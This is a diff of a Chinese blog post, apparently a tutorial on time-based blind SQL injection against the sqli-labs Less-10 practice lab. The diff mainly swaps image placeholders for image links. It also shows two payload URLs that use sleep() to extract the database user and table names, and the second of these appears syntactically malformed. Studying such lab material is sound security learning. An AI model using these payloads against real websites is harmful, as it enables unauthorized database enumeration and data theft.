@@ -9,17 +9,20 @@ tags: web安全 sql注入 时间盲注
 ## 时间盲注
 
 ### 时间盲注原理
-【图片】
-【图片】
+![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/06/01.png)
+![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/06/02.png)
 
 
 
 ### 时间盲注方法
 
-[时间tupian]
+![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/06/03.png)
 	
 	http://localhost:90/Less-10/?id=1" and if(left(user(),1)='a',0,sleep(3))--+
 
 	http://localhost:90/Less-10/?id=1" and if(left(select table_name from information_schema.tables where table_schema=database() limit 0,1),1)='r',0,sleep(3))--+
 
-【图片】
+时间注入脚本  
+
+![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/06/04.png)
+![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/06/05.png)
